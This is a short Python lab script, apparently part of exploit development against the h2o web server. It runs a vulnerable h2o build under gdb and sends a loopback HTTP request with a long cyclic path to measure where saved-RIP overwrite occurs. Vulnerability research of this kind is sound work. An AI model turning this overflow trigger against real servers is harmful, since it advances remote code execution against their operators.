#!/usr/bin/env python3
"""Throwaway: drive gdb over live loopback h2o, capture saved-RIP corruption geometry."""
import socket
import subprocess
import sys
import time
import urllib.request

ROOT = "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell"
PORT = 17897
n = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
path = "/" + "".join(chr(ord("A") + (i % 26)) for i in range(n))

proc = subprocess.Popen(
    ["gdb", "-q", "-batch", "-x", f"{ROOT}/live/corrupt-layout.gdb", "--args",
     f"{ROOT}/src/vuln/build-plain/h2o", "-c", f"{ROOT}/live/gdb-redirect-min.conf"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
)
for _ in range(100):
    try:
        s = socket.create_connection(("127.0.0.1", PORT), 0.2)
        s.close()
        break
    except OSError:
        time.sleep(0.1)
else:
    print("SERVER_NOT_READY")
try:
    with urllib.request.urlopen(f"http://127.0.0.1:{PORT}{path}", timeout=10) as r:
        print("HTTP", r.status)
except Exception as e:
    print("REQUEST_FAILED", repr(e))
try:
    out, _ = proc.communicate(timeout=30)
except subprocess.TimeoutExpired:
    proc.kill()
    out, _ = proc.communicate()
print(out)
